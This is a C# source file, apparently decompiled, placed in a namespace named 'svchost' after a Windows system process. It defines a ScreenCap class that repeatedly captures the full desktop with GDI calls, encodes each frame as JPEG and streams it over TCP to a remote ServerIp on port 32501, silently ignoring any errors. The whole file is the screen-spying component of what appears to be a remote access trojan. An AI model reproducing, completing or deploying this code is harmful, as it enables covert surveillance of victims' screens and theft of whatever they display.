using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace svchost;

public class ScreenCap
{
	private const int SRCCOPY = 13369376;

	private Bitmap oBackground;

	private int FW;

	private int FH;

	private TcpClient CapClient;

	private NetworkStream CapStream;

	private byte[] SendBytes;

	private int ByteCount;

	public string ServerIp;

	public ScreenCap()
	{
		CapClient = new TcpClient();
	}

	[DllImport("gdi32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CreateDCA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpDriverName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpDeviceName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpOutput, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpInitData);

	[DllImport("GDI32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CreateCompatibleDC(int hDC);

	[DllImport("GDI32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CreateCompatibleBitmap(int hDC, int nWidth, int nHeight);

	[DllImport("gdi32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetDeviceCaps(int hdc, int nIndex);

	[DllImport("GDI32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SelectObject(int hDC, int hObject);

	[DllImport("GDI32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int BitBlt(int srchDC, int srcX, int srcY, int srcW, int srcH, int desthDC, int destX, int destY, int op);

	[DllImport("GDI32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int DeleteDC(int hDC);

	[DllImport("GDI32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int DeleteObject(int hObj);

	public void ScreenCap()
	{
		Thread.Sleep(1000);
		Application.DoEvents();
		try
		{
			try
			{
				CapClient.Connect(ServerIp, 32501);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return;
			}
			CapClient.NoDelay = true;
			CapStream = CapClient.GetStream();
			while (true)
			{
				SendCap();
				byte[] buffer = new byte[checked(CapClient.ReceiveBufferSize + 1)];
				DateTime t = DateAndTime.get_Now().AddSeconds(30.0);
				while (!CapStream.DataAvailable)
				{
					Application.DoEvents();
					Thread.Sleep(10);
					if (DateTime.Compare(DateAndTime.get_Now(), t) > 0)
					{
						CapClient.Close();
						return;
					}
				}
				ByteCount = CapStream.Read(buffer, 0, CapClient.ReceiveBufferSize);
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public void SendCap()
	{
		checked
		{
			byte[] array = new byte[CapClient.ReceiveBufferSize + 1];
			string lpDriverName = "DISPLAY";
			string lpDeviceName = "";
			string lpOutput = "";
			string lpInitData = "";
			int num = CreateDCA(ref lpDriverName, ref lpDeviceName, ref lpOutput, ref lpInitData);
			int num2 = CreateCompatibleDC(num);
			FW = GetDeviceCaps(num, 8);
			FH = GetDeviceCaps(num, 10);
			int hObject = CreateCompatibleBitmap(num, FW, FH);
			int hObject2 = SelectObject(num2, hObject);
			BitBlt(num2, 0, 0, FW, FH, num, 0, 0, 13369376);
			hObject = SelectObject(num2, hObject2);
			DeleteDC(num);
			DeleteDC(num2);
			IntPtr intPtr = new IntPtr(hObject);
			oBackground = Image.FromHbitmap(intPtr);
			DeleteObject(hObject);
			MemoryStream memoryStream = new MemoryStream();
			((Image)oBackground).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
			SendBytes = Encoding.Default.GetBytes("\u0001" + memoryStream.Length + "\u0003");
			CapStream.Write(SendBytes, 0, SendBytes.Length);
			DateTime t = DateAndTime.get_Now().AddSeconds(10.0);
			do
			{
				if (!CapStream.DataAvailable)
				{
					Application.DoEvents();
					Thread.Sleep(10);
					continue;
				}
				ByteCount = CapStream.Read(array, 0, CapClient.ReceiveBufferSize);
				string @string = Encoding.Default.GetString(array, 0, ByteCount);
				if (@string.StartsWith("Q"))
				{
					@string = @string.Replace("Q", "");
					_ = (int)Math.Round(Conversion.Val(@string));
				}
				byte[] array2 = new byte[(int)(memoryStream.Length - 1L) + 1];
				memoryStream.Seek(0L, SeekOrigin.Begin);
				memoryStream.Read(array2, 0, (int)memoryStream.Length);
				CapStream.Write(array2, 0, array2.Length);
				memoryStream.Close();
				return;
			}
			while (DateTime.Compare(DateAndTime.get_Now(), t) <= 0);
			CapStream.Close();
			CapClient.Close();
		}
	}
}
